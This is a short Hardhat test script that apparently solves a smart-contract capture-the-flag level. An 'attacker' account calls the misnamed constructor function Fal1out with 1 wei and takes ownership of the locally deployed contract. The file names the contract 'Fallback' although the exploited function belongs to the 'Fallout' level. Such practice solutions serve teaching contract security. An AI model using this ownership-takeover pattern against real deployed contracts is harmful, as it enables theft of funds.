const { ethers } = require("hardhat")
const { expect } = require("chai")

const CONTRACT_NAME = "Fallback"

describe(CONTRACT_NAME, () => {
    let attacker
    let contract
    let tx

    beforeEach(async () => {
        ;[attacker] = await ethers.getSigners()
        const factory = await ethers.getContractFactory(CONTRACT_NAME)
        contract = await factory.deploy()
        await contract.deployed()

        contract = contract.connect(attacker)
    })

    it("Solves the challenge", async () => {
        tx = await contract.Fal1out({ value: 1 })
        await tx.wait()

        const owner = await contract.owner()
        expect(owner).to.eq(attacker.address)
    })
})
